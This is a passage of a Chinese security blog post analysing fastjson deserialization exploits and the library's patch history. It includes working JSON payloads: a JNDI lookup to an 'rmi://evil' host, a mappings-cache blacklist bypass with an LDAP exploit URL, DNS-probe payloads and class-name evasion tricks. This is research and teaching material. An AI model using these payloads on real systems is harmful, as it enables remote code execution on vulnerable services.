alt=image-20200106232029570 src=/images/talk-about-fastjson-deserialization-20200413/image-20200106232029570.png></p> <p>那么很明显，我们可以直接填入<code>outputProperties</code>的方法来触发<code>getOutputProperties</code>（他恰巧无setter，返回值也符合条件）。但是有一个问题是我们需要填充的类属性都是private类型，要想执行该利用链，需要在调用parseObject函数时填入<code>Feature.SupportNonPublicField</code>。以下图为例，将调用计算器</p> <div class=highlight><pre><span></span><code><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a><span class=n>String</span><span class=w> </span><span class=n>jsonString</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&quot;{\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span><span class=w> </span><span class=o>+</span>
<a id=__codelineno-7-2 name=__codelineno-7-2 href=#__codelineno-7-2></a><span class=w>        </span><span class=s>&quot;\&quot;_name\&quot;:\&quot;goodjob\&quot;,\&quot;_tfactory\&quot;:{},&quot;</span><span class=w> </span><span class=o>+</span>
<a id=__codelineno-7-3 name=__codelineno-7-3 href=#__codelineno-7-3></a><span class=w>        </span><span class=s>&quot;\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAOgoAA...\&quot;],&quot;</span><span class=w> </span><span class=o>+</span>
<a id=__codelineno-7-4 name=__codelineno-7-4 href=#__codelineno-7-4></a><span class=w>        </span><span class=s>&quot;\&quot;_outputProperties\&quot;:null}&quot;</span><span class=p>;</span>
</code></pre></div> <p>这里的bytecodes可以用ysoserial工具来生成。在构造payload的时候，需要注意的是<code>_tfactory</code>必须填上，因为在执行过程中，如果它为null，会报错无法进入载入bytecodes的步骤。非常好的是，我们只要填上<code>_tfactory:{}</code>，fastjson会自动帮我们调用TransformerFactoryImpl（_tfactory的类）的无参构造函数进行实例化。<code>\_</code>在smartMatch函数被替换为空。</p> <p>除此之外，byte[]类型在fastjson转化中会被base64编码</p> <p><img alt=image-20200106233142450 src=/images/talk-about-fastjson-deserialization-20200413/image-20200106233142450.png></p> <p>所以payload中是一长串base64的字串。</p> <p>可以看到这个poc其实限制还是挺大的，需要fastjson parseObject时填上<code>Feature.SupportNonPublicField</code>才可以。</p> <h3 id=2-jndi>(2). 基于JNDI的利用</h3> <p>我们都知道如果JNDI的lookup函数参数值可控，那么我们可以利用JNDI Reference的方法加载远程代码达成RCE利用。所以根据前面的分析，如果我们可以在<code>无参构造函数</code>、<code>符合条件的setter</code>、<code>符合条件的getter</code>里发现一个可控的lookup函数，我们就可以利用JNDI的注入方法来达成利用。</p> <h4 id=jdbcrowsetimpl>JdbcRowSetImpl</h4> <p>JdbcRowSetImpl对象可以被我们用做上述的利用，来看一下他的代码</p> <p><img alt=image-20200407105109680 src=/images/talk-about-fastjson-deserialization-20200413/image-20200407105109680.png></p> <p>这次出问题的地方在于setAutoCommit函数，该函数调用了connect函数来重新发起一个jdbc的连接</p> <p><img alt=image-20200407105258958 src=/images/talk-about-fastjson-deserialization-20200413/image-20200407105258958.png></p> <p>在connect函数里我们可以看到调用了lookup函数，其参数值由<code>getDataSourceName</code>来获取，该函数主要返回属性<code>dataSource</code>，根据fastjson的利用原理，我们只需要填充<code>dataSource</code>和<code>autoCommit</code>就可以触发这里的JNDI注入。</p> <div class=highlight><pre><span></span><code><a id=__codelineno-8-1 name=__codelineno-8-1 href=#__codelineno-8-1></a><span class=p>{</span><span class=nt>&quot;@type&quot;</span><span class=p>:</span><span class=s2>&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class=p>,</span><span class=nt>&quot;dataSourceName&quot;</span><span class=p>:</span><span class=s2>&quot;rmi://evil:1099/test&quot;</span><span class=p>,</span><span class=nt>&quot;autoCommit&quot;</span><span class=p>:</span><span class=kc>true</span><span class=p>}</span>
</code></pre></div> <p>还有很多其他的可以用来JNDI注入的对象，比如<code>org.hibernate.jmx.StatisticsService</code>的<code>setSessionFactoryJNDIName</code>函数，原理一样不再叙述。</p> <h3 id=3-tomcat-dbcp-basicdatasource>(3). Tomcat dbcp BasicDataSource</h3> <p>同1中的TemplateImpl，BasicDataSource也可以载入任意的对象来执行任意代码。先来讲一下他的原理</p> <p>前面的基础知识里提到了我们可以调用符合条件的getters，在<code>BasicDataSource</code>存在一个<code>getConnection</code>函数，他主要调用<code>createConnectionFactory</code></p> <p><img alt=image-20200411132559759 src=/images/talk-about-fastjson-deserialization-20200413/image-20200411132559759.png></p> <p>在<code>createConnectionFactory</code>函数使用Class.forName加载类</p> <p><img alt=image-20200411132736300 src=/images/talk-about-fastjson-deserialization-20200413/image-20200411132736300.png></p> <p>这部分driverClassName和driverClassLoader是可控的，这时候我们要用到的是<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，这个ClassLoader可以从classname中提取出BCEL格式的class字节码，并调用defineClass进行载入</p> <p><img alt=image-20200411134429055 src=/images/talk-about-fastjson-deserialization-20200413/image-20200411134429055.png></p> <p>这里我们可以写一个用了静态块的类来执行代码。</p> <h2 id=0x03-fastjson>0x03 Fastjson历史版本修复措施</h2> <hr> <p>这一部分主要讲述几个重要版本的安全更新</p> <h3 id=1-fastjson-1225>(1). fastjson == 1.2.25</h3> <p>默认关闭<code>AutoType</code>，需要手动开启<code>@type</code>的支持，见<a href=https://github.com/alibaba/fastjson/wiki/enable_autotype>enable_autotype</a></p> <p><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code></p> <p><img alt=image-20200411232403665 src=/images/talk-about-fastjson-deserialization-20200413/image-20200411232403665.png></p> <p>当遇到<code>@type</code>时，会先<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</code>。该函数的一个主要逻辑（1.2.25版本）</p> <ol> <li>开启了<code>AutoType</code>时，会过一次黑名单和白名单检测（先检测白名单，后检测黑名单）。</li> </ol> <p><img alt=image-20200412223524510 src=/images/talk-about-fastjson-deserialization-20200413/image-20200412223524510.png></p> <p>优先载入人工配置的白名单类，并对黑名单类爆出异常；</p> <ol> <li> <p>这里先忽略未开启<code>AutoType</code>时的检测处理</p> </li> <li> <p>前面的情况都不符合，并且开启了<code>AutoType</code>，则尝试去载入任意类，但是不可以载入ClassLoader和DataSource的子类</p> </li> </ol> <p><img alt=image-20200412224904669 src=/images/talk-about-fastjson-deserialization-20200413/image-20200412224904669.png></p> <p>这里载入的方法用的都是<code>TypeUtils.loadClass</code>，来看一下他的一个处理</p> <ul> <li>首先他对于<code>Lxxx.class.xxx;</code>的类表示方法做<code>L</code>,<code>;</code>的剔除，递归调用loadClass去调用内部的具体类</li> </ul> <p><img alt=image-20200412232825982 src=/images/talk-about-fastjson-deserialization-20200413/image-20200412232825982.png></p> <ul> <li>后续的调用方法为使用<code>AppClassLoader.loadClass</code>或<code>Class.forName</code>去加载类</li> </ul> <h4 id=autotype>开启<code>AutoType</code>的情况下绕过黑名单检测</h4> <p>根据上面的分析，如果开启了<code>AutoType</code>，那么如果是在白名单里的类，直接加载，对于在黑名单内的类直接抛出异常。</p> <p>而黑名单的检测方式是去匹配当前的类名<code>class.startsWith(deny)</code></p> <p><img alt=image-20200412233730761 src=/images/talk-about-fastjson-deserialization-20200413/image-20200412233730761.png></p> <p>而在这个黑名单里显然并没有考虑到<code>TypeUtils.loadClass</code>实现中，对于<code>Lxxxx.class.xxx;</code>的处理。</p> <p>通过<code>Lxxxxx;</code>的方式<code>startsWith</code>没办法正常匹配出来，所以我们可以绕过黑名单的检测。</p> <h3 id=2-fastjson-1242>(2). fastjson == 1.2.42</h3> <p>在这个版本，对上面的黑名单检测绕过做了修复，并且将黑名单里的类型进行hash处理，增加了分析难度；</p> <p>对于前面<code>Lxxxxx;</code>的绕过，42版本添加了以下代码来剔除（因为黑名单已经变成了hash比较的方式，这里<code>L;</code>都以这种方式来确认）</p> <p><img alt=image-20200413114125856 src=/images/talk-about-fastjson-deserialization-20200413/image-20200413114125856.png></p> <p>但是这里的处理治标不治本，我们使用<code>LLxxxxx;;</code>这种方式就可以绕过。</p> <p>除此之外，由于现在的黑名单变成了hash计算的方式，给我们分析增加了不少难度，不过有大佬对黑名单hash做了还原见<a href=https://github.com/LeadroyaL/fastjson-blacklist>fastjson-blacklist</a></p> <h3 id=3-fastjson-1243>(3). fastjson == 1.2.43</h3> <p>这个版本主要修复了上面<code>LLxxxx;;</code>的方式</p> <p><img alt=image-20200413125108171 src=/images/talk-about-fastjson-deserialization-20200413/image-20200413125108171.png></p> <p>做了两次检测，如果碰上<code>LLxxxxx;;</code>的方式则直接爆出异常</p> <h3 id=4-fastjson-1248>(4). fastjson == 1.2.48</h3> <h4 id=_1>修复前的版本</h4> <p>在48版本之前，<code>checkAutoType</code>还存在这样一个逻辑（以1.2.47为例）</p> <p><img alt=image-20200413130933666 src=/images/talk-about-fastjson-deserialization-20200413/image-20200413130933666.png></p> <p>当开启<code>AutoType</code>时，如果mappings里面存在这个类，那么就算这个类在黑名单里，也允许他进行下一步操作</p> <p>PS：这里的mappings是fastjson提早载入的一些缓存类</p> <p><img alt=image-20200413131026571 src=/images/talk-about-fastjson-deserialization-20200413/image-20200413131026571.png></p> <p>后续如果能从mappings里面得到这个类，就直接返回。那么我们有没有什么方法将我们需要的类加入到这个mappings里呢？</p> <p>先来看一下<code>deserializers.findClass</code>，在<code>deserializers</code>里面预先填充了一些类与其反序列化器的实例</p> <p><img alt=image-20200413131650373 src=/images/talk-about-fastjson-deserialization-20200413/image-20200413131650373.png></p> <p>这里我们主要关注一下<code>Class.class</code>，他所对应的反序列化器为<code>MiscCodec</code>，<code>checkAutoType</code>检测过后，后续将调用反序列化器的<code>deserialze</code>函数。来看看MiscCodec的这个函数对于<code>Class.class</code>的处理</p> <p><img alt=image-20200413132337804 src=/images/talk-about-fastjson-deserialization-20200413/image-20200413132337804.png></p> <p>他调用了<code>TypeUtils.loadClass</code>函数，前面我们讲过，他将使用<code>ClassLoader.loadClass</code>或<code>Class.forName</code>来载入类，在这一过程中，涉及到了<code>mappings</code>的操作</p> <p><img alt=image-20200413132644597 src=/images/talk-about-fastjson-deserialization-20200413/image-20200413132644597.png></p> <p><img alt=image-20200413132704804 src=/images/talk-about-fastjson-deserialization-20200413/image-20200413132704804.png></p> <p>这里的<code>cache</code>默认为<code>true</code>，所以这里会直接将载入后的对象填入<code>mappings</code></p> <p>根据我们前面的分析，如果当前<code>mappings</code>里存在可控的类，那么不管开没开启<code>AutoType</code>，都会进行类还原；同时我们利用<code>Class.class</code>可以向<code>mappings</code>填充任意类，这导致绕过了前面的检测；</p> <div class=highlight><pre><span></span><code><a id=__codelineno-9-1 name=__codelineno-9-1 href=#__codelineno-9-1></a><span class=c1>// 举个例子</span>
<a id=__codelineno-9-2 name=__codelineno-9-2 href=#__codelineno-9-2></a><span class=n>json</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&quot;{&quot;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=c1>// 用Class载入com.sun.rowset.JdbcRowSetImpl，并缓存到mappings</span>
<a id=__codelineno-9-3 name=__codelineno-9-3 href=#__codelineno-9-3></a><span class=w>          </span><span class=s>&quot;{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},&quot;</span><span class=w> </span><span class=o>+</span>
<a id=__codelineno-9-4 name=__codelineno-9-4 href=#__codelineno-9-4></a><span class=w>                    </span><span class=c1>// 后续使用mappings里的com.sun.rowset.JdbcRowSetImpl来还原对象</span>
<a id=__codelineno-9-5 name=__codelineno-9-5 href=#__codelineno-9-5></a><span class=w>          </span><span class=s>&quot;{\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span><span class=w> </span><span class=o>+</span>
<a id=__codelineno-9-6 name=__codelineno-9-6 href=#__codelineno-9-6></a><span class=w>          </span><span class=s>&quot;\&quot;dataSourceName\&quot;: \&quot;ldap://localhost:1389/Exploit\&quot;,&quot;</span><span class=w> </span><span class=o>+</span>
<a id=__codelineno-9-7 name=__codelineno-9-7 href=#__codelineno-9-7></a><span class=w>          </span><span class=s>&quot;\&quot;autoCommit\&quot;: true}&quot;</span><span class=w> </span><span class=o>+</span>
<a id=__codelineno-9-8 name=__codelineno-9-8 href=#__codelineno-9-8></a><span class=w>        </span><span class=s>&quot;}&quot;</span><span class=p>;</span>
</code></pre></div> <h4 id=_2>修复后的版本</h4> <p>在1.2.48版本上对其进行了修复</p> <p>在<code>MiscCodec</code>对Class的处理中，修改了<code>cache=false</code></p> <p><img alt=image-20200413134143022 src=/images/talk-about-fastjson-deserialization-20200413/image-20200413134143022.png></p> <p>并且对于<code>TypeUtils.loadClass</code>里的<code>mappings</code>操作都依赖于<code>cache</code>，如果为<code>false</code>则不添加到<code>mappings</code>里（在前面的版本里<code>Class.forName</code>部分并不依赖cache，48版本之后增加了对cache的判断）</p> <p>与此同时，<code>java.lang.Class</code>也被加入到了黑名单里面</p> <h3 id=5>(5). 后续版本</h3> <p>后续版本的绕过主要围绕在：</p> <ul> <li>开启<code>AutoType</code>，绕过黑名单检测</li> <li>利用<code>deserializers</code>里面的类(跟<code>Class.class</code>一个原理)</li> </ul> <p>最新版1.2.68引入了<a href=https://github.com/alibaba/fastjson/wiki/fastjson_safemode>safeMode</a>，在<code>checkAutoType</code>里添加了下面判断，如果开启了safemode，那么将不允许进行<code>@type</code></p> <p><img alt=image-20200413161935377 src=/images/talk-about-fastjson-deserialization-20200413/image-20200413161935377.png></p> <p>不过这个并不是默认开启的，需要人工去配置。</p> <h3 id=6>(6). 后续版本觉得有意思的利用</h3> <ul> <li> <p>fastjson &lt; 1.2.60 dos <a href=http://m0d9.me/2019/09/06/Fastjson-1-2-60-Dos分析/ >Fastjson-1-2-60-Dos</a></p> </li> <li> <p>使用dnslog来检测fastjson漏洞 https://github.com/alibaba/fastjson/issues/3077</p> </li> </ul> <p>这里的原理跟<code>Class.class</code>是一样的，只是换成了<code>java.net.URL</code>、<code>java.net.Inet4Address</code>、<code>java.net.Inet6Address</code>，由MiscCodec处理时会去触发dns查询</p> <p>当然这里的触发URL的触发用的ysoserial里面的URLDNS的方式，由hashcode去触发；</p> <div class=highlight><pre><span></span><code><a id=__codelineno-10-1 name=__codelineno-10-1 href=#__codelineno-10-1></a>{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}
<a id=__codelineno-10-2 name=__codelineno-10-2 href=#__codelineno-10-2></a>{&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}
<a id=__codelineno-10-3 name=__codelineno-10-3 href=#__codelineno-10-3></a>{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://s81twxdise25yxjinqaar74iq9wzko.burpcollaborator.net&quot;}:&quot;aaa&quot;}
</code></pre></div> <h2 id=0x04>0x04 总结</h2> <hr> <p>到这里fastjson相关的知识点就梳理结束了，这其中开发者与安全研究人员的攻防交互真是令人称快！后续如果有其他的绕过，还会继续写下去。</p> <p>总结一下fastjson利用中的特色：</p> <ul> <li>反序列化时主动触发符合条件的setters和getters，其中使用parse和parseObject函数，在getter利用上parseObject的限制更低一点；但是这里我们可以利用本文的两种方法将parse的调用效果转化为parseObject</li> <li><code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>是个好东西</li> <li>fastjson的黑名单绕过来看，基本上找的都是jndi相关的利用，或许可以扩展一些其他的？</li> <li>有时候开发者理解不到位，打得补丁可以轻松被绕过，所以需要紧盯补丁的情况</li> </ul> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg> 回到页面顶部 </a> </main> <footer class=md-footer> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../../..", "features": ["navigation.tabs", "navigation.top"], "search": "../../../assets/javascripts/workers/search.e5c33ebb.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script> <script src=../../../assets/javascripts/bundle.ba449ae6.min.js></script> </body> </html>